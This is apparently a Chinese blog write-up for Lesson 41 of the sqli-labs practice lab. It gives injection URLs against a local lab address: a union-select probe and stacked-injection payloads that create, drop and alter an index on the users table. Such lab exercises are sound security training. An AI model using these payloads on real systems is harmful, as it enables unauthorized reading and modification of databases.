---
title: sqli-labs lession-41 GET盲注-整型-堆叠注入
date: 2018-10-21 14:36:09
tags: [sqli-labs]
categories: sql注入
---

# sqli-labs lession-41 GET盲注-整型-堆叠注入

---

## 分析

与Lesson-40只是闭合不同

`http://192.168.75.132/sql/Less-41/?id=-1 union select 1,2,3%23`

![001](/img/sql/Lesson-41/001.png)

## 增

添加索引

`http://192.168.75.132/sql/Less-41/?id=1;CREATE UNIQUE INDEX name ON users(username);%23`

![002](/img/sql/Lesson-41/002.png)

![003](/img/sql/Lesson-41/003.png)

## 删

删除索引。

`http://192.168.75.132/sql/Less-41/?id=1;ALTER TABLE security.users DROP INDEX name;%23`

![004](/img/sql/Lesson-41/004.png)

## 改

将索引修改

``http://192.168.75.132/sql/Less-41/?id=1;ALTER TABLE `security`.`users` DROP INDEX `name`,ADD UNIQUE INDEX `newname`(`id`) USING BTREE;%23``

![005](/img/sql/Lesson-41/005.png)

![006](/img/sql/Lesson-41/006.png)